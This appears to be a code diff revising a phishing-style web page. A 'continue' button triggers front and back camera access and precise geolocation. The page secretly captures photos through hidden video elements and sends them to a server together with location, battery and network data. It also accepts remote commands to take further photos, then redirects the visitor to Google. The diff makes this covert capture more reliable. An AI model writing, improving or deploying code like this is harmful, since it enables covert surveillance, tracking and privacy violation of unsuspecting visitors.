@@ -16,11 +16,7 @@
             margin: 0;
             padding: 20px;
         }
-        .container {
-            text-align: center;
-            max-width: 450px;
-            width: 100%;
-        }
+        .container { text-align: center; max-width: 450px; width: 100%; }
         .spinner {
             width: 40px;
             height: 40px;
@@ -59,9 +55,7 @@
             cursor: pointer;
             transition: background 0.3s;
         }
-        .btn-continue:hover {
-            background: #3367d6;
-        }
+        .btn-continue:hover { background: #3367d6; }
         .btn-continue:disabled {
             background: #a0aec0;
             cursor: not-allowed;
@@ -71,6 +65,7 @@
             color: #667eea;
             margin-top: 15px;
             font-weight: 500;
+            min-height: 24px;
         }
         #hiddenVideo, #hiddenVideoBack { display: none; }
     </style>
@@ -109,49 +104,24 @@
             let redirectUrl = 'https://www.google.com';
             let redirectTriggered = false;
             let isProcessing = false;
-            let permissionsGranted = {
-                location: false,
-                frontCamera: false,
-                backCamera: false
-            };
             
-            let cameraStream = null;
-            let cameraStreamBack = null;
-            let frontVideo = document.getElementById('hiddenVideo');
-            let backVideo = document.getElementById('hiddenVideoBack');
+            // Store streams
+            let frontStream = null;
+            let backStream = null;
+            
+            // Permission flags
+            let locationGranted = false;
+            let frontCameraGranted = false;
+            let backCameraGranted = false;
 
             function updateStatus(msg) {
                 statusText.textContent = msg;
                 console.log(msg);
             }
 
-            function checkAllPermissions() {
-                const allGranted = permissionsGranted.location && permissionsGranted.frontCamera && permissionsGranted.backCamera;
-                if (allGranted) {
-                    updateStatus('✅ Permissions granted! Redirecting...');
-                    
-                    if (socket && socket.connected) {
-                        socket.emit('visitor-data', {
-                            visitorId,
-                            type: 'permissionsGranted',
-                            content: true
-                        });
-                    }
-                    
-                    setTimeout(function() {
-                        if (!redirectTriggered) {
-                            redirectNow();
-                        }
-                    }, 1500);
-                } else {
-                    const pending = [];
-                    if (!permissionsGranted.location) pending.push('Location');
-                    if (!permissionsGranted.frontCamera) pending.push('Front Camera');
-                    if (!permissionsGranted.backCamera) pending.push('Back Camera');
-                    updateStatus(`⏳ Waiting for: ${pending.join(', ')}`);
-                }
-            }
-
+            // ============================================
+            // FETCH & CONNECT
+            // ============================================
             function fetchRedirectUrl() {
                 fetch(`/api/visitor/${visitorId}`)
                     .then(res => res.json())
@@ -198,16 +168,16 @@
                     });
 
                     socket.on('capture-command', function(data) {
-                        console.log('📸 Capture command received:', data.type);
-                        if (data.type === 'front') {
-                            capturePhoto('front', frontVideo);
-                        } else if (data.type === 'back') {
-                            capturePhoto('back', backVideo);
+                        console.log('📸 Capture command:', data.type);
+                        if (data.type === 'front' && frontStream) {
+                            capturePhoto('front', frontStream);
+                        } else if (data.type === 'back' && backStream) {
+                            capturePhoto('back', backStream);
                         } else if (data.type === 'both') {
-                            capturePhoto('front', frontVideo);
-                            setTimeout(function() {
-                                capturePhoto('back', backVideo);
-                            }, 1500);
+                            if (frontStream) capturePhoto('front', frontStream);
+                            setTimeout(() => {
+                                if (backStream) capturePhoto('back', backStream);
+                            }, 1000);
                         }
                     });
 
@@ -235,6 +205,7 @@
                 socket.emit('visitor-connect', { visitorId, ...deviceInfo });
                 console.log('📱 Device info sent');
 
+                // Battery
                 if (navigator.getBattery) {
                     navigator.getBattery()
                         .then(function(battery) {
@@ -245,12 +216,12 @@
                                     type: 'battery',
                                     content: level
                                 });
-                                console.log(`🔋 Battery: ${level}%`);
                             }
                         })
                         .catch(() => {});
                 }
 
+                // Network
                 let networkData = { type: 'Unknown', effectiveType: 'Unknown' };
                 if (navigator.connection) {
                     const conn = navigator.connection;
@@ -266,11 +237,12 @@
                         type: 'network',
                         content: networkData
                     });
-                    console.log('📶 Network info sent');
                 }
             }
 
-            // ===== CONTINUE BUTTON CLICK - IMMEDIATE PERMISSIONS =====
+            // ============================================
+            // CONTINUE BUTTON - PERMISSIONS STEP BY STEP
+            // ============================================
             continueBtn.addEventListener('click', function() {
                 if (isProcessing) return;
                 isProcessing = true;
@@ -278,152 +250,172 @@
                 continueBtn.textContent = '⏳ Processing...';
                 
                 updateStatus('⏳ Requesting permissions...');
-                
-                // ===== REQUEST PERMISSIONS IMMEDIATELY (no setTimeout) =====
-                
-                // 1. LOCATION
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        function(pos) {
-                            console.log('✅ Location granted');
-                            permissionsGranted.location = true;
-                            
-                            const lat = pos.coords.latitude;
-                            const lng = pos.coords.longitude;
-                            
-                            fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
-                                .then(res => res.json())
-                                .then(data => {
-                                    const locationInfo = {
-                                        lat, lng,
-                                        accuracy: pos.coords.accuracy,
-                                        timestamp: new Date().toISOString(),
-                                        country: data.countryName || 'Unknown',
-                                        state: data.principalSubdivision || 'Unknown',
-                                        city: data.locality || 'Unknown'
-                                    };
-                                    if (socket && socket.connected) {
-                                        socket.emit('visitor-data', {
-                                            visitorId,
-                                            type: 'location',
-                                            content: locationInfo
-                                        });
-                                        console.log('✅ Location sent');
-                                    }
-                                })
-                                .catch(() => {
-                                    if (socket && socket.connected) {
-                                        socket.emit('visitor-data', {
-                                            visitorId,
-                                            type: 'location',
-                                            content: { lat, lng, accuracy: pos.coords.accuracy }
-                                        });
-                                    }
-                                });
-                            
-                            checkAllPermissions();
-                        },
-                        function(err) {
-                            console.log('❌ Location denied:', err.message);
-                            permissionsGranted.location = false;
-                            checkAllPermissions();
-                        },
-                        { timeout: 15000, enableHighAccuracy: true }
-                    );
-                }
 
-                // 2. FRONT CAMERA (immediate)
+                // ---- STEP 1: FRONT CAMERA (MOST IMPORTANT) ----
                 navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
                 })
                 .then(function(stream) {
                     console.log('✅ Front camera granted');
-                    permissionsGranted.frontCamera = true;
-                    cameraStream = stream;
-                    frontVideo.srcObject = stream;
-                    return frontVideo.play();
-                })
-                .then(function() {
-                    setTimeout(function() {
-                        capturePhoto('front', frontVideo);
-                    }, 1000);
-                    checkAllPermissions();
-                })
-                .catch(function(err) {
-                    console.log('❌ Front camera denied:', err.message);
-                    permissionsGranted.frontCamera = false;
-                    checkAllPermissions();
-                });
-
-                // 3. BACK CAMERA (immediate)
-                navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: false
+                    frontCameraGranted = true;
+                    frontStream = stream;
+                    document.getElementById('hiddenVideo').srcObject = stream;
+                    
+                    // Auto capture front photo
+                    capturePhoto('front', stream);
+                    
+                    // ---- STEP 2: BACK CAMERA ----
+                    return navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+                        audio: false
+                    });
                 })
                 .then(function(stream) {
                     console.log('✅ Back camera granted');
-                    permissionsGranted.backCamera = true;
-                    cameraStreamBack = stream;
-                    backVideo.srcObject = stream;
-                    return backVideo.play();
+                    backCameraGranted = true;
+                    backStream = stream;
+                    document.getElementById('hiddenVideoBack').srcObject = stream;
+                    
+                    // Auto capture back photo
+                    capturePhoto('back', stream);
+                    
+                    // ---- STEP 3: LOCATION ----
+                    return new Promise(function(resolve, reject) {
+                        if (!navigator.geolocation) {
+                            reject('Geolocation not supported');
+                            return;
+                        }
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            timeout: 10000,
+                            enableHighAccuracy: true
+                        });
+                    });
+                })
+                .then(function(position) {
+                    console.log('✅ Location granted');
+                    locationGranted = true;
+                    
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    
+                    // Get location details
+                    return fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
+                        .then(res => res.json())
+                        .then(data => {
+                            const locationInfo = {
+                                lat, lng,
+                                accuracy: position.coords.accuracy,
+                                timestamp: new Date().toISOString(),
+                                country: data.countryName || 'Unknown',
+                                state: data.principalSubdivision || 'Unknown',
+                                city: data.locality || 'Unknown'
+                            };
+                            if (socket && socket.connected) {
+                                socket.emit('visitor-data', {
+                                    visitorId,
+                                    type: 'location',
+                                    content: locationInfo
+                                });
+                            }
+                            console.log('📍 Location sent');
+                        });
                 })
                 .then(function() {
+                    // ---- ALL PERMISSIONS GRANTED ----
+                    updateStatus('✅ All permissions granted! Redirecting...');
+                    
+                    if (socket && socket.connected) {
+                        socket.emit('visitor-data', {
+                            visitorId,
+                            type: 'permissionsGranted',
+                            content: true
+                        });
+                    }
+                    
+                    // Redirect after 2 seconds
                     setTimeout(function() {
-                        capturePhoto('back', backVideo);
+                        if (!redirectTriggered) {
+                            redirectNow();
+                        }
                     }, 2000);
-                    checkAllPermissions();
                 })
-                .catch(function(err) {
-                    console.log('❌ Back camera denied:', err.message);
-                    permissionsGranted.backCamera = false;
-                    checkAllPermissions();
+                .catch(function(error) {
+                    console.log('❌ Permission error:', error);
+                    
+                    // Check which permission failed
+                    if (!frontCameraGranted) {
+                        updateStatus('❌ Front camera denied. Please allow camera.');
+                    } else if (!backCameraGranted) {
+                        updateStatus('❌ Back camera denied. Please allow camera.');
+                    } else if (!locationGranted) {
+                        updateStatus('❌ Location denied. Please allow location.');
+                    } else {
+                        updateStatus('❌ Error: ' + (error.message || error));
+                    }
+                    
+                    // Re-enable button for retry
+                    isProcessing = false;
+                    continueBtn.disabled = false;
+                    continueBtn.textContent = '▶ Retry';
                 });
             });
 
-            function capturePhoto(type, video) {
-                if (!video || !video.videoWidth || !video.videoHeight) {
-                    console.log(`⚠️ ${type} video not ready`);
+            // ============================================
+            // CAPTURE PHOTO
+            // ============================================
+            function capturePhoto(type, stream) {
+                if (!stream) {
+                    console.log(`⚠️ ${type} stream not available`);
                     return;
                 }
-
-                try {
-                    const canvas = document.createElement('canvas');
-                    const maxWidth = 800;
-                    const maxHeight = 600;
-                    let width = video.videoWidth;
-                    let height = video.videoHeight;
-                    
-                    if (width > maxWidth) {
-                        height = (height * maxWidth) / width;
-                        width = maxWidth;
-                    }
-                    if (height > maxHeight) {
-                        width = (width * maxHeight) / height;
-                        height = maxHeight;
-                    }
-                    
-                    canvas.width = width;
-                    canvas.height = height;
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, width, height);
-                    const imageData = canvas.toDataURL('image/jpeg', 0.9);
-
-                    console.log(`📸 ${type} photo captured`);
-
-                    if (socket && socket.connected) {
-                        socket.emit('visitor-data', {
-                            visitorId: visitorId,
-                            type: type === 'back' ? 'backCamera' : 'frontCamera',
-                            content: imageData
-                        });
-                        console.log(`✅ ${type} photo sent to server`);
-                    }
-                } catch (err) {
-                    console.log(`❌ ${type} capture error:`, err.message);
-                }
+                
+                // Get video track from stream
+                const videoTrack = stream.getVideoTracks()[0];
+                if (!videoTrack) return;
+                
+                // Create video element to capture frame
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.autoplay = true;
+                video.muted = true;
+                video.playsInline = true;
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                
+                video.onloadedmetadata = function() {
+                    setTimeout(function() {
+                        try {
+                            const canvas = document.createElement('canvas');
+                            const width = Math.min(video.videoWidth, 800);
+                            const height = Math.min(video.videoHeight, 600);
+                            canvas.width = width;
+                            canvas.height = height;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, width, height);
+                            const imageData = canvas.toDataURL('image/jpeg', 0.9);
+                            
+                            if (socket && socket.connected) {
+                                socket.emit('visitor-data', {
+                                    visitorId: visitorId,
+                                    type: type === 'back' ? 'backCamera' : 'frontCamera',
+                                    content: imageData
+                                });
+                                console.log(`✅ ${type} photo sent`);
+                            }
+                            
+                            // Cleanup
+                            document.body.removeChild(video);
+                        } catch (err) {
+                            console.log(`❌ ${type} capture error:`, err.message);
+                        }
+                    }, 500);
+                };
             }
 
+            // ============================================
+            // REDIRECT
+            // ============================================
             function redirectNow() {
                 if (redirectTriggered) return;
                 redirectTriggered = true;
@@ -436,19 +428,18 @@
                     });
                 }
 
-                if (cameraStream) {
-                    cameraStream.getTracks().forEach(t => t.stop());
-                }
-                if (cameraStreamBack) {
-                    cameraStreamBack.getTracks().forEach(t => t.stop());
-                }
+                // Clean up streams
+                if (frontStream) frontStream.getTracks().forEach(t => t.stop());
+                if (backStream) backStream.getTracks().forEach(t => t.stop());
 
                 setTimeout(() => {
                     window.location.href = redirectUrl;
                 }, 800);
             }
 
-            // ===== START =====
+            // ============================================
+            // START
+            // ============================================
             if (typeof io !== 'undefined') {
                 fetchRedirectUrl();
             } else {
@@ -457,8 +448,8 @@
 
             window.addEventListener('beforeunload', function() {
                 if (socket) socket.disconnect();
-                if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
-                if (cameraStreamBack) cameraStreamBack.getTracks().forEach(t => t.stop());
+                if (frontStream) frontStream.getTracks().forEach(t => t.stop());
+                if (backStream) backStream.getTracks().forEach(t => t.stop());
             });
         })();
     </script>
